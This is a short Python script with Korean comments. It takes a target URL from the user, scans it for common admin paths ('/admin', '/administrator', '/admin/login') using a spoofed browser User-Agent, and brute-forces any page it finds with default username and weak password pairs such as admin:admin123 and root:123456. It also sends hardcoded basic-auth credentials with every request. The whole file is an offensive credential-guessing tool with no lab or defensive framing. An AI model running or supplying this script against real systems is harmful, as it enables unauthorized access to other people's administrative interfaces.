import requests
from requests.auth import HTTPBasicAuth

# 테스트할 관리자 경로 리스트
paths = ['/admin', '/administrator', '/admin/login']

# 사용자 이름과 비밀번호 (기본 인증)
usernames = ['admin', 'administrator', 'root']
passwords = ['admin123', 'password', '123456']

# 사용자로부터 타겟 URL 입력받기
target_url = input('타겟 URL을 입력하세요 (예: http://example.com 또는 http://<IP_ADDRESS>): ')

# 기본 인증 처리 (사용자 이름과 비밀번호는 튜플로 전달)
auth = HTTPBasicAuth('admin', 'password')  # 올바른 튜플 형식

# 헤더 설정 (User-Agent)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

for path in paths:
    url = target_url + path
    try:
        # 관리자 페이지가 존재하는지 확인 (User-Agent와 인증을 포함한 요청)
        response = requests.get(url, headers=headers, auth=auth)
        if response.status_code == 200:
            print(f'경로 발견: {url} - 로그인 시도 시작')
            for username in usernames:
                for password in passwords:
                    payload = {'username': username, 'password': password}
                    # 로그인 시도 (User-Agent와 인증을 포함한 POST 요청)
                    login_response = requests.post(url, data=payload, headers=headers, auth=auth)
                    if 'Welcome' in login_response.text:
                        print(f'성공적인 로그인: {url} - {username}:{password}')
                        break
        else:
            print(f'경로 실패: {url} (HTTP 상태 코드: {response.status_code})')
    except requests.exceptions.RequestException as e:
        print(f'요청 실패: {url} - 오류: {e}')